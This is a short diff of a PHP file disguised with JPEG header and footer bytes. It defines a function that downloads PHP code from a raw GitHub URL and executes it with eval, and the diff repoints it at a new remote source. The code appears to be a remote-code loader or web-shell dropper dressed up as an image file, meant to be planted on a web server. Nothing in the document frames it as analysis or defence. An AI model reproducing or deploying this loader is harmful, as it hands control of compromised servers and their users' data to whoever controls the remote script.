@@ -1,3 +1,4 @@
+ÿØÿàJFIFÿÛ
 <?php
 function getRemotePHP($url) {
     $ch = curl_init($url);
@@ -18,5 +19,7 @@ function getRemotePHP($url) {
     eval("?>$code");
 }
 
-getRemotePHP('https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/raw.php');
+getRemotePHP('https://raw.githubusercontent.com/asukoe1337/function/main/function.php');
+
 ?>
+ÿÙ
